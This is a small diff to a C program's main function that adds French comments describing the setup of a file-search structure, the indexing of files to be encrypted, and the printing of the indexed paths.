@@ -114,8 +114,13 @@ int main(int argc, char const *argv[])
         init_safe_mode_area();
     }
 
+    /* Initialisation de la structure pour la recherche de fichier */
     listFileData* p_listFileData = init_list_file_data();
+
+    /* Indexation des fichiers à chiffrer */
     files_finder(p_listFileData, paths, 1);
+
+    /* Affichage des fichiers indexés */
     print_path_data(p_listFileData);
 
     if (g_encryption)
